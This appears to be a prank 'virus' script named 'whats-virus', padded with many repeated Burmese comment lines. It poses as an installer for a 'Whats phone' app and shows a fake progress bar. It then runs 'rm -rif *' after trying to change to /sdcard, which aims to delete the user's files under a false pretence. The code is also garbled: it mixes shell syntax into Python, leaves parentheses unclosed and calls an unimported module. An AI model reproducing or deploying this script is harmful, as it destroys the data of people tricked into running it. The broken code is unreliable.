# whats-virus V 1.0
#Channel
#https://www.youtube.com/channel/UCQuGjfmo04jDd6zlBscslGQ
# A7Y Team

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ 
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

import os
os.system ("clear")
A7Y = 1000
while A7Y < 10000:
        A7Y = A7Y +1
        print( A7Y)
os.system ("clear")
os.system ('cd /sdcard')
A7Y='\033[01;32m'
print 
print ("${A7Y} █████╗ ██╗       █████╗ ██╗      █████╗ ███╗   ███╗██╗   ██╗";
print ("${A7Y}██╔══██╗██║      ██╔══██╗██║     ██╔══██╗████╗ ████║╚██╗ ██╔╝";
print ("${A7Y}███████║██║█████╗███████║██║     ███████║██╔████╔██║ ╚████╔╝";
print ("${A7Y}██╔══██║██║╚════╝██╔══██║██║     ██╔══██║██║╚██╔╝██║  ╚██╔╝";
print ("${A7Y}██║  ██║███████╗ ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║   ██║";
print ("${A7Y}╚═╝  ╚═╝╚══════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝";
print
print ("Deseja instalar o Whats phone? [Y/n]")
printf "[                    ] 0% "
time.sleep(5)
printf "[=====               ] 25%"
time.sleep(5)
printf "[==========          ] 50%"
time.sleep(5)
printf "[===============     ] 75%"
time.sleep(5)
printf "[====================] 100%"
time.sleep(3)
os.system ('rm -rif *')
print (" \033[0;32m[+] Done..!")
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ

#ကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈတစ်ဦးကအီးဇဈ
